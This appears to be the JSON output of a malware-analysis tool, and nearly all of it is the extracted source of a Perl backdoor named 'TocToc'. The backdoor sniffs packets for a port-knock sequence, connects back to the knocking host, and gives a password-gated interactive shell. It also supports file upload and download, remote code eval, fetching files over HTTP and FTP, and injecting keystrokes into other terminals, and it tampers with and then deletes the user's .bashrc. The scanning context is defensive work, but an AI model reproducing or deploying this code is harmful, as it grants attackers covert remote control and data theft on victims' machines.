            "  $rdr->fdopen(fileno(CHILD_RDR), 'r');",
            "  $rdr->blocking(0);",
            "  my %SHELL;",
            "  my %CLIENT;",
            "  my $connections = 0;",
            "  my $sel_serv = IO::Select->new();",
            "  my $sel_shell = IO::Select->new();",
            "  my $rdr_buf = '';",
            "  while ( 1 ) {",
            "    sleep(2) if ($connections == 0); # dont wast cpu when not needed",
            "    if (defined(my $n = $rdr->sysread($rdr_buf, 4096))) {",
            "      rdr_parse(\"$rdr_buf\");",
            "      $rdr_buf = '';",
            "    }",
            "    my @ready = $sel_serv->can_read(0);",
            "    foreach my $fh (@ready) {",
            "      my $msg;",
            "      my $nread = sysread($fh, $msg, 4096);",
            "      if ($nread == 0) {",
            "        close_client($fh);",
            "      } elsif (not defined($CLIENT{$fh}{senha})) {",
            "          my $m = $msg;",
            "          $m =~ s/\\n$//;",
            "          if (crypt($m, $pass) eq $pass) {",
            "            $CLIENT{$fh}{senha} = 1;",
            "            write_client($fh, \"\\002\\001\\002\\n\");",
            "            $fh->autoflush(1);",
            "            new_shell($fh);",
            "          } else {",
            "              finish_client($fh, \"\\001\\002\\001\\003\\n\");",
            "          }",
            "      } elsif (defined($CLIENT{$fh}{senha}) and $CLIENT{$fh}{senha} == 1) {",
            "          parse_msg($fh, $msg);",
            "      }",
            "    }",
            "    my @shell_ready = $sel_shell->can_read(0);",
            "    foreach my $shell (@shell_ready) {",
            "      read_shell($shell);",
            "    }",
            "##############",
            "# CHILD SUBS #",
            "##############",
            "  sub rdr_parse {",
            "    my $msg = shift;",
            "    my @lines = split(/\\n/, $msg);",
            "    foreach my $line (@lines) {",
            "      if ($line =~ /^CONN (.*)/) {",
            "        open_conn(split(':',$1));",
            "      }",
            "    }",
            "  sub open_conn {",
            "    my ($ip, $port) = @_;",
            "    my $sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=> $ip, PeerPort=>$port, Timeout => 7) || return(undef);",
            "    $connections++;",
            "    $sel_serv->add($sock);",
            "    write_client($sock, \"\\001\\002\\001\\n\");",
            "  sub read_shell {",
            "    my $shell = shift;",
            "    my $cli;",
            "    my $msg = '';",
            "    foreach my $s (keys(%SHELL)) {",
            "      if ($SHELL{$s} eq $shell) {",
            "        $cli = $s;",
            "        last;",
            "      }",
            "    }",
            "    my $read = sysread($shell, $msg, $buffer);",
            "    if ($read == 0) {",
            "      finish_client($cli, \"Terminal closed.\\n\");",
            "      $shell->close;",
            "      $sel_shell->remove($shell);",
            "    } else {",
            "       write_client($cli, $msg);",
            "    }",
            "  sub gr_sock {",
            "    my $cli = shift;",
            "    foreach my $s ($sel_serv->can_write(1)) {",
            "      return($s) if ($s eq $cli);",
            "    }",
            "    return(undef);",
            "  sub gr_shell {",
            "    my $shell = shift;",
            "    foreach my $s ($sel_shell->can_write(1)) {",
            "      return($s) if ($s eq $shell);",
            "    }",
            "    return(undef);",
            "  sub new_shell {",
            "    my $cli = shift;",
            "    my $pty = new IO::Pty;",
            "    my $bashrc_file = \"$home/.bashrc\";",
            "    $bashrc_file =~ s/^\\/\\//\\//;",
            "    unless ($pty) {",
            "      finish_client($cli, \"ERRO: There is no PTYs devices available.\\n\");",
            "    }",
            "    my $pid = fork();",
            "    $CLIENT{$cli}{SHELL_PID} = $pid;",
            "    if (not defined($pid)) {",
            "      finish_client($cli, \"ERRO: fork()\\n\");",
            "    }",
            "    unless ($pid) {",
            "      $pty->make_slave_controlling_terminal();",
            "      my $slave = $pty->slave();",
            "      close $pty;",
            "      $slave->set_raw();",
            "      unless (open(STDIN,\"<&\". $slave->fileno())) {",
            "        finish_client($cli,\"Couldn't reopen STDIN for reading.\\n\");",
            "        exit;",
            "      }",
            "      unless (open(STDOUT,\">&\". $slave->fileno())) {",
            "         finish_client($cli, \"Couldn't reopen STDOUT for writing.\\n\");",
            "         exit;",
            "      }",
            "      unless (open(STDERR,\">&\". $slave->fileno())) {",
            "        finish_client($cli, \"Couldn't reopen STDERR for writing.\\n\");",
            "        exit;",
            "      }",
            "      STDOUT->autoflush(1);",
            "      STDIN->autoflush(1);",
            "      STDERR->autoflush(1);",
            "      close $slave;",
            "      ReadMode 0;",
            "      sleep 1;",
            "      IO::Stty::stty(\\*STDIN,\"sane\");",
            "      chdir(\"$home\");",
            "      my $command = join(';', @commands);",
            "      if (defined($command)) {",
            "        system(\"$command &\"); # '&' to execute it in backgroud",
            "        sleep(1); # to get the commands answer",
            "                  # i hope 1 sec is enougth",
            "      }",
            "      # writing out .bashrc",
            "      open(BRC, \"> $bashrc_file\");",
            "      print BRC join(\"\\n\", @bashrc);",
            "      { exec(\"$shell\") };",
            "      syswrite(STDOUT, \"ERRO: exec($shell)\\n\");",
            "      exit;",
            "    }",
            "    $pty->close_slave();",
            "    $pty->set_raw();",
            "    $SHELL{$cli} = $pty;",
            "    $sel_shell->add($pty);",
            "  sub parse_msg {",
            "    my ($cli, $msg) = @_;",
            "    if ($msg =~ /\\001T:(.+?)\\s(.*):\\002\\n/) {",
            "      while ($msg =~ m/\\001T:(.+?)\\s(.*):\\002\\n/g) {",
            "        my $cmd  = $1;",
            "        my $arg  = $2;",
            "        my @args = split(/ +/, $arg);",
            "        if ($arg eq \"ABORT\") {",
            "          if ($cmd eq \"DOWNLOAD\") {",
            "            my $pipe = $CLIENT{$cli}{DOWNLOAD_PIPE} if (defined($CLIENT{$cli}{DOWNLOAD_PIPE}));",
            "            if (defined($pipe)) {",
            "               print $pipe \"ABORT\\n\";",
            "               close($pipe);",
            "               delete($CLIENT{$cli}{DOWNLOAD_PIPE});",
            "            }",
            "          }",
            "          next;",
            "        } ",
            "        if ($cmd eq \"TERM_SIZE\") {",
            "          my $shell = gr_shell($SHELL{$cli});",
            "          return() unless (scalar(@args) == 4);",
            "          SetTerminalSize(@args, $shell);",
            "          if (defined($CLIENT{$cli}{termsize})) {        ",
            "            write_client($cli, \"\\nTerminal size has changed.\\n\\n\");",
            "          } else {",
            "              $CLIENT{$cli}{termsize} = 1;",
            "          }",
            "        } elsif ($cmd eq \"HIJACK\") {",
            "            my $chars = join(\" \", @args[1 .. $#args]);",
            "            hijack($cli, $args[0], $chars);",
            "        } elsif ($cmd eq \"GET\") {",
            "            sendfile($cli, @args);",
            "        } elsif ($cmd eq \"PUT\") {",
            "            getfile($cli, @args);",
            "        } elsif ($cmd eq \"EVAL\") {",
            "            my $ret = eval \"$arg\";",
            "            spm_done($cli, $cmd, \"Evaluation returned: $ret\");",
            "        } elsif ($cmd eq \"SOCKLIST\") {",
            "            socklist($cli, \"$arg\");",
            "            spm_done($cli, $cmd);",
            "        } elsif ($cmd eq \"PROXY\") {",
            "            proxy($cli, @args);",
            "        } elsif ($cmd eq \"PWD\") {",
            "            my $dir = getcwd();",
            "            spm_done($cli, $cmd, \"$dir\");",
            "        } elsif ($cmd eq \"LAG\") {",
            "            spm_done($cli, $cmd, $arg);",
            "        } elsif ($cmd eq \"CD\") {",
            "            if (chdir(\"$arg\")) {",
            "              my $dir = getcwd();",
            "              spm($cli, $cmd, \"Changed directory to: $dir\");",
            "            } else {",
            "               spm($cli, $cmd, \"I could not change directory to: $arg\");",
            "            }",
            "            spm_done($cli, $cmd);",
            "        } elsif ($cmd eq \"DOWNLOAD\") {",
            "            my ($url, $file) = @args;",
            "            my $pwd = getcwd();",
            "            unless(defined($file)) {",
            "              $file = $url;",
            "              $file =~ s/^.*\\/(\\S+)$/$1/;",
            "            }",
            "            $file = \"$pwd/$file\";",
            "            $file =~ s/^\\/\\//\\//;",
            "            unless(open(FILE, \"> $file\")) {",
            "              spm_done($cli, $cmd, \"Error: Cannot creat $file\");",
            "              next;",
            "            }",
            "            close(FILE);",
            "            unless(download($cli, $url, $file))  {",
            "              spm_done($cli, $cmd, \"Error: I could not fork() the process.\");",
            "              next;",
            "            }",
            "        } elsif ($cmd eq \"PS\") {",
            "            my @ps = ps();",
            "            if (scalar(@ps) == 0) {",
            "              spm_done($cli, $cmd, \"None hidden procces has been found.\");",
            "            } else {",
            "               foreach my $ps (@ps) {",
            "                 spm($cli, $cmd, \"$ps\");",
            "               }",
            "               spm_done($cli, $cmd);",
            "            }",
            "        } else {",
            "           spm_done($cli, $cmd, \"Error: Command not implemented in this version ($VERSION).\");",
            "        }",
            "      }",
            "    } else { ",
            "       write_shell($cli, $msg);",
            "    }",
            "  sub spm_done {",
            "     my ($cli, $cmd, $msg) = @_;",
            "     if (defined($msg)) {",
            "       spm($cli, $cmd, $msg);",
            "     }",
            "     spm($cli, $cmd, \"DONE\");",
            "  sub spm {",
            "    my ($cli, $cmd, $ans) = @_;",
            "    write_client($cli, \"\\001T:$cmd $ans:\\002\\n\");",
            "  sub ps {",
            "    opendir(DIR, \"/proc\");",
            "    my @proc= readdir(DIR);",
            "    close DIR;",
            "    my @ps=`ps ax`;",
            "    my ($p, $c, $cmd, @retr);",
            "    for(@proc) {",
            "      $p = $_;",
            "      if (/^\\d+/) {",
            "        $c=0;",
            "        for (@ps) {",
            "          /(\\d+)\\s+/;",
            "          if ($p == $1) { $c=1; }",
            "        }",
            "        if ($c == 0) {",
            "          open(PID, \"/proc/$p/cmdline\");",
            "          $cmd =<PID>;",
            "          close PID;",
            "          $cmd =~ s/\\0/ /g;",
            "          $cmd =~ s/^(.*)\\s+$/$1/;",
            "          push (@retr, \"PID: $p ($cmd)\");",
            "        }",
            "      }",
            "    }",
            "    return (@retr);",
            "  sub hijack {",
            "    my ($cli, $device, $msg) = @_;",
            "    unless(open(TTY, \"+>$device\")) {",
            "      spm_done($cli, \"HIJACK\", \"I could not open tty $device\");",
            "      return();",
            "    }",
            "    # i hope it works",
            "    unless (defined(&TIOCSTI)) {",
            "      spm($cli, \"HIJACK\", \"WARNING: Trying to define &TIOCSTI, propably 'sys/ioctl.ph' wasn't loaded. Its not recommended to go on, type 'close' or type the last command again ($msg).\");",
            "      eval 'sub TIOCSTI () {0x5412;}';",
            "      spm_done($cli, \"HIJACK\");",
            "    }",
            "    $msg .= \"\\n\";",
            "    foreach my $char (split('', $msg)) {",
            "      spm($cli, \"HIJACK\", \"Hey yo! I couldn't write on $device: $!\")",
            "      unless (ioctl(TTY, &TIOCSTI, $char));",
            "    }",
            "    close(TTY);",
            "    spm_done($cli, \"HIJACK\");",
            "  sub getfile {",
            "     my ($cli, $file, $port) = @_;",
            "     $cli = gr_sock($cli);",
            "     my $pid = fork();",
            "     return(undef) if (not defined($pid));",
            "     unless ($pid) {",
            "       my $transfer = IO::Socket::INET->new(PeerAddr => $cli->peerhost, PeerPort => \"$port\", Proto => 'tcp', Timeout=> 10);",
            "       exit unless($transfer);",
            "       $transfer->autoflush(1);",
            "       my $OK = 1;",
            "       if (-e \"$file\") {",
            "         syswrite($transfer, \"File already exists.\", 20);",
            "         $OK = 0;",
            "       }",
            "       unless (open(FILE, \"> $file\")) {",
            "         syswrite($transfer, \"I could not open the file.\", 26);",
            "         $OK = 0;",
            "       }",
            "       syswrite($transfer, \"OK\", 2) if ($OK == 1);",
            "       my $msg;",
            "       my $got_info = 0;       ",
            "       my $bytes = 0;",
            "       while ( 1 ) {",
            "          my $ready = sysread($transfer, $msg, $buffer);",
            "          if ($ready == 0) {",
            "             close(FILE);",
            "             exit;",
            "          }",
            "          if ($got_info == 0) {",
            "            $got_info = 1;",
            "            syswrite($transfer, '0', 1);",
            "            next;",
            "          }",
            "          print FILE $msg;",
            "          $bytes += length($msg);",
            "          syswrite($transfer, $bytes, length($bytes));",
            "       }",
            "       exit;",
            "     }",
            "  sub sendfile {",
            "     my ($cli, $file, $port) = @_;",
            "     $cli = gr_sock($cli);",
            "     my $pid = fork();",
            "     return(undef) if (not defined($pid));",
            "     unless ($pid) {",
            "       my $transfer = IO::Socket::INET->new(PeerAddr => $cli->peerhost, PeerPort => \"$port\", Proto => 'tcp', Timeout=> 10);",
            "       exit unless($transfer);",
            "       $transfer->autoflush(1);",
            "       unless (-e \"$file\") {",
            "          syswrite($transfer, \"File not found.\", 15);",
            "       }",
            "       unless (open(FILE, \"< $file\")) {",
            "         syswrite($transfer, \"I could not open the file.\", 26);",
            "       }",
            "       my $bytes = (stat(\"$file\"))[7];",
            "       syswrite($transfer, $bytes, length($bytes));",
            "       my $msg;",
            "       ",
            "       while ( 1 ) {",
            "          my $ready = sysread($transfer, $msg, $buffer);",
            "          if ($ready == 0) {",
            "            close(FILE);",
            "            exit;",
            "          }",
            "          seek(FILE, $msg, 0);",
            "          my $send_bytes;",
            "          read(FILE, $send_bytes, $buffer);",
            "          syswrite($transfer, $send_bytes, length($send_bytes));",
            "       }",
            "       exit;",
            "     }",
            "  # socklist by Larry Doolittle <ldoolitt@jlab.org> September 1997",
            "  # adapted for TocToc use",
            "  sub socklist {",
            "    my ($cli, $proto) = @_;",
            "    undef($proto) if ($proto eq \"0\" );",
            "    our $init = 0;",
            "    my %sock_proc;",
            "    opendir (PROC, \"/proc\") || spm($cli, \"SOCKLIST\", \"Error: Could not open /proc\");",
            "    for my $f (readdir(PROC)) {",
            "        next if (! ($f=~/[0-9]+/) );",
            "        if (! opendir (PORTS, \"/proc/$f/fd\")) {",
            "            closedir PORTS;",
            "            next;",
            "        }",
            "        for my $g (readdir(PORTS)) {",
            "            next if (! ($g=~/[0-9]+/) );",
            "            my $r=readlink(\"/proc/$f/fd/$g\");",
            "    ",
            "            my ($dev,$ino)=($r=~/^(socket|\\[[0-9a-fA-F]*\\]):\\[?([0-9]*)\\]?$/);",
            "            if ($dev == \"[0000]\" || $dev == \"socket\") {$sock_proc{$ino}=$f.\":\".$g;}    }",
            "        closedir PORTS;",
            "    }",
            "    closedir PROC;",
            "    sub scheck {",
            "      open(FILE,\"/proc/net/\".$_[0]) || spm($cli, \"SOCKLIST\", \"Error: Could not open file /proc/net/\".$_[0].\" for reading.\");",
            "      while (<FILE>) {",
            "          my @F=split();",
            "          next if ($F[9]=~/uid/);",
            "          my @A=split(\":\",$F[1]);",
            "          my $a=hex($A[1]);",
            "          my ($pid,$fd)=($sock_proc{$F[9]}=~m.([0-9]*):([0-9]*).);",
            "          my $cmd = \"\";",
            "          if ($pid && open (CMD,\"/proc/$pid/status\")) {",
            "             my $l = <CMD>;",
            "             ($cmd) = ( $l=~/Name:\\s*(\\S+)/ );",
            "             close(CMD);",
            "          }",
            "          if ($init == 0 ) {",
            "              spm($cli, \"SOCKLIST\", \"type  port      inode     uid    pid   fd  name\");",
            "              $init = 1;",
            "          }",
            "          my $string = sprintf(\"%s %6d %10d  %6d %6d %4d  %s\", $_[0],$a ,$F[9], $F[7], $pid, $fd, $cmd);",
            "          spm($cli, \"SOCKLIST\", $string);",
            "      }",
            "      close(FILE);",
            "    }",
            "    if (not defined($proto)) {",
            "      scheck(\"tcp\");",
            "      scheck(\"udp\");",
            "      scheck(\"raw\");",
            "    } elsif (grep { $_ eq $proto } (\"tcp\", \"udp\", \"raw\")) {",
            "        scheck(\"$proto\");",
            "    } else {",
            "       spm($cli, \"SOCKLIST\", \"Error: protocol \".uc($proto).\" not found in the list (UDP, TCP, RAW)\");",
            "    }",
            "       ",
            "  sub download {",
            "    my ($cli, $link, $file) = @_;",
            "    pipe(RDR, WTR);",
            "    WTR->autoflush(1);",
            "    RDR->autoflush(1);",
            "    $CLIENT{$cli}{DOWNLOAD_PIPE} = \\*WTR;",
            "    my $pid = fork();",
            "    return(undef) if not defined($pid);",
            "    unless($pid) {",
            "      close(WTR);",
            "      unless(open(FILE, \"> $file\")) {",
            "        spm_done($cli, \"DOWNLOAD\", \"I could not open $file for writting\");",
            "        exit;",
            "      }",
            "      my $first = 1;",
            "      my $init_time;",
            "      my $saved_data = 0;",
            "      if ($link =~ /^http/i) {",
            "        my $ua = LWP::UserAgent->new(keep_alive => 1,  timeout => 30 );",
            "        my $req = new HTTP::Request GET => $link;",
            "        my $res = $ua->request($req,\\&http_save_data, 4096);",
            "        $init_time = time;",
            "        if ($res->header(\"X-Died\") || !$res->is_success) {",
            "          spm($cli, \"DOWNLOAD\", \"Error: Download was interrupted by peer\");",
            "        } else {",
            "           spm($cli, \"DOWNLOAD\", \"Download finished, file $file has been saved.\");",
            "        }",
            "      } elsif ($link =~ /^ftp/i) {",
            "          $link =~ s/^ftp:\\/\\///;",
            "          $link =~ /(.+?)\\/(.*)/;",
            "          my $host = $1;",
            "          my $file = $2;",
            "          my $save = $link;",
            "          $save =~ s/.*\\/(.+?)$/$1/;",
            "          unless ($host or $file) {",
            "            spm_done($cli, \"DOWNLOAD\", \"Unrecognized ftp link\");",
            "            exit;",
            "          }",
            "          my $sock = IO::Socket::INET->new(PeerAddr => \"$host\", PeerPort => 21, Proto => \"tcp\", Timeout => 15);",
            "          unless ($sock) {",
            "            spm_done($cli, \"DOWNLOAD\", \"Error: I could not connect on host ($host:21)\");",
            "            exit;",
            "          }",
            "          my $logado = 0;",
            "          print $sock \"USER anonymous\\nPASS anonymous\\@anonymous.com\\n\";",
            "          my ($size, $trans);",
            "          while (<$sock>) {",
            "             my $buf = $_;",
            "             $buf =~ s/\\n//;",
            "             if ($buf =~ /^230/ and $logado == 0) {",
            "               $logado = 1;",
            "               print $sock \"TYPE I\\nPASV\\nRETR $file\\n\";",
            "             } elsif ($buf =~ /^150.+?\\((\\d+)\\s.+?\\)/) {",
            "                $size = $1;",
            "                $init_time = time;",
            "                my $saved_data = 0;",
            "                open(FILE, \"> $save\");",
            "                while (<$trans>) {",
            "                  print FILE $_;",
            "                  $saved_data += length($_);",
            "                  gotta_die();",
            "                  if ($first == 1) {",
            "                    spm($cli, \"DOWNLOAD\", \"Status: Downloading $link ($size size). Type ^C to abort\");",
            "                    $first = 0;",
            "                  } else {",
            "                     spm($cli, \"DOWNLOAD\", \"$init_time $saved_data $size\");",
            "                  }",
            "                }",
            "                close(FILE);",
            "                print $sock \"QUIT\\n\";",
            "                last;",
            "             } elsif ($buf =~ /^530/ and $logado == 1) {",
            "                 spm_done($cli, \"DOWNLOAD\", \"Error: File not found.\");",
            "                 exit;",
            "             } elsif ($buf =~ /^227.+?\\((.*)\\)/) {",
            "                 my @info = split(',', $1);",
            "                 my $host = join('.', @info[0 .. 3]);",
            "                 my $port = $info[4] * 256 + $info[5];",
            "                 $trans = IO::Socket::INET->new(PeerAddr => \"$host\", PeerPort => \"$port\", Proto => \"tcp\");",
            "                 unless ($trans) {",
            "                   spm_done($cli, \"DOWNLOAD\", \"Error: I could not estabilish the transfer connection\\n\");",
            "                   exit;",
            "                 }",
            "             }",
            "          }",
            "      }",
            "      spm_done($cli, \"DOWNLOAD\");",
            "      sleep(1);",
            "      exit;",
            "      sub http_save_data {",
            "        my($data, $response, $protocol) = @_;",
            "        print FILE $data;",
            "        gotta_die();",
            "        $saved_data += length($data);",
            "        my $total_data = $response->content_length;",
            "        if ($first == 1) {",
            "          spm($cli, \"DOWNLOAD\", \"Status: Downloading $link ($total_data size). Type ^C to abort\");",
            "          $first = 0;",
            "        } else {",
            "            spm($cli, \"DOWNLOAD\", \"$init_time $saved_data $total_data\");",
            "        }",
            "      }",
            "      sub gotta_die {",
            "        my $readfields = '';",
            "        vec($readfields, fileno(RDR), 1) = 1;",
            "        my $ready = select($readfields, undef, undef, 0);",
            "        if ($ready == 1) {",
            "          spm_done($cli, \"DOWNLOAD\", \"Operetion aborted!\");",
            "          sleep(1);",
            "          exit;",
            "        }",
            "      }",
            "    }",
            "    close(RDR);",
            "    return(1);",
            "      ",
            "  sub write_shell {",
            "    my ($cli, $msg) = @_;",
            "    my $shell = gr_shell($SHELL{$cli});",
            "    unlink(\"$home/.bashrc\") if (-e \"$home/.bashrc\"); # here we check and delete ",
            "                                                     # the file",
            "    return(syswrite($shell, $msg, length($msg)));",
            "  sub write_client {",
            "     my ($cli, $msg) = @_;",
            "     my $cli_sock = gr_sock($cli);",
            "     return() if (not defined($cli_sock));",
            "     syswrite($cli_sock, $msg, length($msg));",
            "  sub finish_client {",
            "    my ($cli, $msg) = @_;",
            "    write_client($cli, $msg);",
            "    close_client($cli);",
            "  sub close_client {",
            "    my $cli = gr_sock(shift);",
            "    $sel_serv->remove($cli);",
            "    if (defined($SHELL{$cli})) {",
            "      my $shell = $SHELL{$cli};",
            "      $sel_serv->remove($shell);",
            "      close($shell);",
            "      my $shell_pid = $CLIENT{$cli}{SHELL_PID};",
            "      kill(9, $shell_pid) if ($shell_pid);",
            "      delete($SHELL{$cli});",
            "    }",
            "    delete($CLIENT{$cli});",
            "    $cli->close() if(defined($cli));",
            "    $connections--;",
            "} # END OF CHILD   ",
            "close(CHILD_RDR);",
            "while ( 1 ) {",
            "  loop $psck,-1,\\&parse,@p;",
            "#############",
            "# MAIN SUBS #",
            "#############",
            "sub conecta {",
            "#  print \"conectando no cliente...\\n\";",
            "  my ($ip, $port) = @_;",
            "  syswrite(PARENT_WTR, \"CONN $ip:$port\\n\");",
            "# The parse() have been ripped from RawSniff (v0.8) by David Hulton",
            "# and addapted",
            "sub parse {",
            "  if ($c == 50) { $c=0; undef(%c_ipt) } # pra num gasta muita mem",
            "  my $pckt=$_[2];",
            "  my $flags=unpack(\"B8\",substr($pckt,$offset+$ip+13,1));",
            "  my $conck=substr($flags,6,1);",
            "  my $disconck=substr($flags,7,1);",
            "  my @saddr=unpack(\"CCCC\",substr($pckt,$offset+12,4));",
            "  $pd{'saddr'}=join('.',@saddr);",
            "  $pd{'shost'}=$pd{'saddr'};",
            "  my @daddr=unpack(\"CCCC\",substr($pckt,$offset+16,4));",
            "  $pd{'daddr'}=join('.',@daddr);",
            "  $pd{'dhost'}=$pd{'daddr'};",
            "  $pd{'sport'}=unpack(\"nn\",substr($pckt,$offset+$ip,4));",
            "  $pd{'dport'}=unpack(\"nn\",substr($pckt,$offset+$ip+2,4));",
            "  if ($conck) {",
            "    $c++;",
            "    $c_ipt{$c}{ip}   = $pd{'saddr'};",
            "    $c_ipt{$c}{port} = $pd{'dport'};",
            "    $c_ipt{$c}{'time'} = time;",
            "  }  ",
            "  foreach my $con (keys(%c_ipt)) {",
            "    next if (not defined($c_ipt{$con+1}) or not defined($c_ipt{$con+2}));",
            "    if ($c_ipt{$con}{port} == $bdp1 and",
            "        $c_ipt{$con+1}{port} == $bdp2 and",
            "        $c_ipt{$con}{ip} eq $c_ipt{$con+1}{ip} and",
            "        $c_ipt{$con+2}{ip} eq $c_ipt{$con}{ip} and",
            "        ($c_ipt{$con+1}{'time'}-$c_ipt{$con}{'time'}) > 1 and",
            "        ($c_ipt{$con+1}{'time'}-$c_ipt{$con}{'time'}) < 10) {",
            "        conecta($c_ipt{$con}{ip}, $c_ipt{$con+2}{port});",
            "        undef(%c_ipt);",
            "        $c=0;",
            "        last;",
            "    }"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.431091",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
